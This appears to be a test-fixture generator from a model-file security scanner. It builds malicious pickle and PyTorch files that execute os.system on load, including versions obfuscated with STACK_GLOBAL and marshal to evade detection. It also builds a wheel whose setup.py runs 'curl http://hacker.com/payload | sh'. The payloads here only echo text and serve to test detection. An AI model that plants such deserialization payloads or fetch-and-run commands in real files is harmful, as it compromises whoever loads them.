# Copyright 2025 Veritensor Security
#
# UTILITY FOR TESTING ONLY. DO NOT USE IN PRODUCTION.
# This module generates harmless "test viruses" to verify Veritensor detection capabilities.
# It uses the 'fickling' library to create obfuscated Pickle payloads.

import os
import zipfile
import io
import logging
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)

# Try to import Fickling for advanced obfuscation.
# If missing, we fall back to standard pickle (which is less stealthy but works for basic tests).
try:
    from fickling.fickle import Pickled, Proto, Stop, Global, StackGlobal, ShortBinUnicode, TupleOne, Reduce
    import fickling.fickle as op
    FICKLING_AVAILABLE = True
except ImportError:
    FICKLING_AVAILABLE = False
    logger.warning("Fickling library not found. Advanced obfuscation tests will be skipped.")


class MalwareGenerator:
    """
    Factory class to generate malicious artifacts for testing.
    """

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def generate_all(self):
        """Generates a full suite of test vectors."""
        self.create_simple_rce_pickle()
        self.create_pytorch_zip_virus()
        self.create_malicious_wheel() # [NEW] Added wheel generation
        
        if FICKLING_AVAILABLE:
            self.create_obfuscated_pickle()
            self.create_marshal_bomb()

    def create_simple_rce_pickle(self, filename: str = "rce_simple.pkl") -> Path:
        """
        Level 1: Standard Pickle RCE using __reduce__.
        Veritensor should catch this via static analysis (finding 'os' and 'system').
        """
        path = self.output_dir / filename
        
        class Malicious:
            def __reduce__(self):
                import os
                return (os.system, ("echo ' [TEST] Simple RCE Triggered'",))

        with open(path, "wb") as f:
            import pickle
            pickle.dump(Malicious(), f)
        
        return path

    def create_pytorch_zip_virus(self, filename: str = "model_infected.pt") -> Path:
        """
        Level 2: PyTorch Supply Chain Attack.
        Valid Zip archive containing a malicious pickle inside 'archive/data.pkl'.
        Veritensor must be able to unzip and scan the contents.
        """
        path = self.output_dir / filename
        
        # 1. Create the payload (bytes)
        class Malicious:
            def __reduce__(self):
                import os
                return (os.system, ("echo ' [TEST] PyTorch RCE Triggered'",))
        
        import pickle
        payload_bytes = pickle.dumps(Malicious())

        # 2. Pack into PyTorch-structure Zip
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as zf:
            # PyTorch standard layout
            zf.writestr("archive/data.pkl", payload_bytes)
            zf.writestr("archive/version", "3\n")
            zf.writestr("archive/data/0", b"tensor_data_placeholder")

        with open(path, "wb") as f:
            f.write(buffer.getvalue())

        return path

    def create_malicious_wheel(self, filename: str = "bad_package.whl") -> Path:
        """
        Level 5: Malicious Python Wheel (.whl).
        Contains a setup.py with hardcoded secrets (simulating a supply chain attack).
        """
        path = self.output_dir / filename
        buffer = io.BytesIO()
        
        # Suspicious content (Secrets)
        setup_py = """
        import os
        from setuptools import setup
        
        # LEAKED CREDENTIALS (IOC)
        AWS_ACCESS_KEY_ID = "AKIA_FAKE_KEY_FOR_TESTING"
        
        # Suspicious command
        os.system("curl http://hacker.com/payload | sh")
        
        setup(name='bad-package', version='1.0')
        """
        
        with zipfile.ZipFile(buffer, "w") as zf:
            zf.writestr("setup.py", setup_py)
            zf.writestr("PKG-INFO", "Metadata-Version: 2.1\nName: bad-package\nVersion: 1.0")
            
        with open(path, "wb") as f:
            f.write(buffer.getvalue())
            
        return path

    def create_obfuscated_pickle(self, filename: str = "rce_obfuscated.pkl") -> Optional[Path]:
        """
        Level 3: Obfuscated RCE using STACK_GLOBAL.
        Constructs 'os.system' dynamically on the stack to bypass Regex scanners.
        Veritensor must use its Pickle VM to detect this.
        """
        if not FICKLING_AVAILABLE:
            return None

        path = self.output_dir / filename
        
        # Opcode sequence:
        # 1. Push "os" string
        # 2. Push "system" string
        # 3. STACK_GLOBAL (imports os.system)
        # 4. Push argument "echo..."
        # 5. TupleOne
        # 6. Reduce (Call function)
        ops = [
            Proto(4),
            ShortBinUnicode("os"),
            ShortBinUnicode("system"),
            StackGlobal(),
            ShortBinUnicode("echo ' [TEST] Obfuscated RCE Triggered'"),
            TupleOne(),
            Reduce(),
            Stop()
        ]
        
        p = Pickled(ops)
        with open(path, "wb") as f:
            p.dump(f)
            
        return path

    def create_marshal_bomb(self, filename: str = "rce_marshal.pkl") -> Optional[Path]:
        """
        Level 4: Bytecode Injection (Marshal).
        Uses `marshal.loads` to execute raw Python bytecode.
        No strings like "os" or "system" exist in the file.
        Veritensor must block the 'marshal' module.
        """
        if not FICKLING_AVAILABLE:
            return None

        path = self.output_dir / filename
        
        import marshal
        
        # The code we want to hide
        secret_code = "import os; os.system('echo [TEST] Marshal RCE')"
        compiled_code = compile(secret_code, "<string>", "exec")
        serialized_code = marshal.dumps(compiled_code)
        
        # We use Fickling to inject a payload that executes this bytecode
        p = Pickled([Proto(4), Stop()])
        
        # Payload: import marshal; exec(marshal.loads(b'...'))
        payload = f"""
import marshal
code_bytes = {serialized_code}
exec(marshal.loads(code_bytes))
        """
        p.insert_python_exec(payload)
        
        with open(path, "wb") as f:
            p.dump(f)
            
        return path
